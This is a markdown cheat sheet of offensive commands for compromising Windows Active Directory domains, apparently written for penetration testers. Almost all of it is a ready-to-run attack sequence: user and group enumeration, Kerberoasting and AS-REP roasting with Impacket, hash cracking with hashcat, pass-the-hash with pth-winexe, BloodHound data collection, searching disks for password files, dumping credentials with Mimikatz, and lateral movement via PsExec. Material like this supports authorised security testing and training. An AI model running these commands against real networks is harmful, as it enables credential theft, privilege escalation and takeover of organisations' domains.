# 🏢 Active Directory (AD) Cheatsheet
*"If it's Kerberoastable, it's probably crackable."*

---

## 🧭 Basic AD Enumeration

### 🧑‍💼 Who Are You?
```bash
whoami
whoami /groups
hostname
ipconfig /all
```

### 🔍 Environment Checks
```bash
set               # Show all environment variables
net config workstation
net config server
```

---

## 🗃️ User, Group, Domain Info

### 📇 User Enumeration
```bash
net user /domain
net group "Domain Admins" /domain
net localgroup
net user <username> /domain
```

### 🏢 Domain Details
```bash
nltest /dclist:<domain>          # List domain controllers
nltest /domain_trusts            # List trust relationships
```

---

## 🛠️ Tools for Enumeration

### 🧰 Using `ldapsearch` (Linux)
```bash
ldapsearch -x -H ldap://<DC_IP> -b "dc=example,dc=com"
```

### 🧰 Using `rpcclient` (Linux)
```bash
rpcclient -U "" <IP>
> enumdomusers
> enumdomgroups
```

### 🧰 Using `crackmapexec`
```bash
cme smb <IP> -u user -p pass --shares
cme smb <IP> -u user -p pass --users
cme smb <IP> -u user -p pass --local-groups
```

---

## 🔓 Kerberoasting

### 🧪 Get Kerberoastable Users (With Impacket)
```bash
GetUserSPNs.py example.com/user:pass -dc-ip <DC_IP> -outputfile hashes.txt
```

### 🔥 Crack Tickets with Hashcat
```bash
hashcat -m 13100 hashes.txt rockyou.txt
```

---

## 📦 AS-REP Roasting

### 🌐 Find Vulnerable Users
```bash
GetNPUsers.py -usersfile users.txt -no-pass example.com/ -dc-ip <DC_IP>
```

### 🔓 Crack AS-REP Hash
```bash
hashcat -m 18200 hash.txt rockyou.txt
```

---

## 🎫 Pass-the-Hash

### 🪪 With `pth-winexe`
```bash
pth-winexe -U 'DOMAIN/user%HASH' //target cmd.exe
```

---

## 🩸 BloodHound (With SharpHound)

### 🦈 Collect AD Data
```powershell
SharpHound.exe -c all
```

### 📊 Analyze with BloodHound GUI (on your host)

---

## 🔑 Credential Hunting

### 🔍 Search for Passwords
```powershell
Get-ChildItem -Path C:\ -Include *pass*,*cred* -Recurse -ErrorAction SilentlyContinue
```

### 🔑 Dump Credentials (If Admin)
```powershell
mimikatz
privilege::debug
logonpasswords
```

---

## 🛡️ Lateral Movement

### 🖥️ Remote Execution
```powershell
Invoke-Command -ComputerName <hostname> -ScriptBlock { whoami }
```

### 💥 PsExec (Admin Shell)
```bash
psexec.exe \\TARGET cmd.exe
```

---

## 📌 Tips

- Look for:
  - Users with `Do not require Kerberos preauthentication` → AS-REP roast
  - SPNs (Service Principal Names) → Kerberoasting
  - Weak permissions on GPOs and scripts

- Tools: [Impacket](https://github.com/SecureAuthCorp/impacket), [BloodHound](https://github.com/BloodHoundAD/BloodHound), [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)

---

> 🧠 "Active Directory is the castle. The misconfigs are the open gates."

